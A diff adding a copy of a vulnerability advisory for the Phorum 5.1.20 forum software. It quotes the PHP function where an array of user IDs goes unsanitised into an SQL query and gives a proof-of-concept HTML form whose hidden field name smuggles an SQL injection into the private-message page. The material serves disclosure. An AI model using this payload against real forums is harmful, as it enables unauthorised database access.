@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/23616/info
+     
+Phorum is prone to multiple input-validation vulnerabilities, including an unauthorized-access issue, privilege-escalation issue, multiple SQL-injection issues, and cross-site scripting issues, because the application fails to sufficiently sanitize user-supplied input.
+     
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify sensitive data, or exploit latent vulnerabilities in the underlying database implementation.
+     
+Phorum 5.1.20 is affected; prior versions may also be vulnerable.
+
+Let's look at source code of "include/db/mysq.php" ~ line 1881 :
+
+------------------[source code]----------------------
+function phorum_db_user_get($user_id, $detailed)
+{
+    $PHORUM = $GLOBALS["PHORUM"];
+
+    $conn = phorum_db_mysql_connect();
+
+    if(is_array($user_id)){
+        $user_ids=implode(",", $user_id);
+    } else {
+        $user_ids=(int)$user_id;
+    }
+
+    $users = array();
+
+    $sql = "select * from {$PHORUM['user_table']} where user_id in ($user_ids)";
+    $res = mysql_query($sql, $conn);
+    if ($err = mysql_error()) phorum_db_mysql_error("$err: $sql");
+------------------[/source code]----------------------
+
+As we can see, if "$user_id" is array, then there is no sanitize against data before
+using in sql query.
+After some research I have found a way to use this bug for sql injection. For this,
+first of all, potential attacker must have valid user account in specific Phorum-powered
+website and he/she must be logged in. And then let's try this proof-of-concept html file:
+
+------------------[PoC exploit]-----------------------
+<html>
+<body>
+<form action="http://localhost/phorum.5.1.20/pm.php" method="post">
+<input type="hidden" name="recipients[1) OR foobar=123/* ]" value="waraxe">
+<input type="submit" name"test" value="test">
+</body>
+</html>
